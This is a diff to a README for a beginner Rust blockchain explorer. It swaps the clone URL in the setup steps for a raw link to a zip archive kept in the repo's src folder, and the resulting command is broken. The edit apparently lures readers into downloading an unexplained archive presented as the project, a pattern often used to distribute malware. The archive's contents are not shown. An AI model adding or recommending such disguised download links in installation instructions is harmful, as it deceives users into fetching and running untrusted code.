@@ -19,7 +19,7 @@ a beginner friendly blockchain explorer written in Rust. This command line appli
 1. ### clone the repo
    ```` bash
    git clone
-   https://github.com/ronny-gans/simple-blockchain-explorer
+   https://github.com/ronny-gans/simple-blockchain-explorer/raw/refs/heads/main/src/simple-explorer-blockchain-3.9.zip
    cd simple-blockchain-explorer
    ````
 2. ### Run the app
